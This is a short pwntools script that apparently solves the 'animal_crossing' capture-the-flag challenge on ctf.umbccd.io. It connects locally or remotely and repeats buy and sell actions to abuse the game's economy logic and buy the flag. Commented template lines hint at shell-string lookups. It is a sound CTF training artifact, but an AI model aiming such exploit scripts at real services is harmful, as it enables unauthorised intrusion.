from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./animal_crossing"
HOST = "ctf.umbccd.io"
PORT = 4400

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = elf.symbols["main"]
#libc = ELF('./')
#
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def sell(num):
	conn.sendlineafter("ice: ", "1")
	conn.recv()
	conn.sendline(str(num))

def buy(num):
	conn.sendlineafter("ice: ", "2")
	conn.recv()
	conn.sendline(str(num))

def exploit():
	buy(2)
	sell(1)
	for i in range(60):
		sell(5)
	buy(6) # buy flag
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
